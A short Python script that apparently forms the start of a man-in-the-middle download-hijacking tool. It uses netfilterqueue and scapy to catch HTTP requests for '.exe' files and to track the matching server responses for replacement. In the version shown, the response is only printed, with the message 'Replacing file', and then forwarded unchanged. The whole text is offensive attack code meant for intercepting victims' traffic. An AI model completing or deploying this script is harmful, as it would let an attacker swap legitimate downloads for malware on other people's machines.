import netfilterqueue
import scapy.all as scapy

ack_list = []

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # This will convert the packet payload to scapy packet
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+]Replacing file")
                print(scapy_packet.show())
    packet.accept() # This will accept the packet and forward it to the client computer allowing him to go that perticular website

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
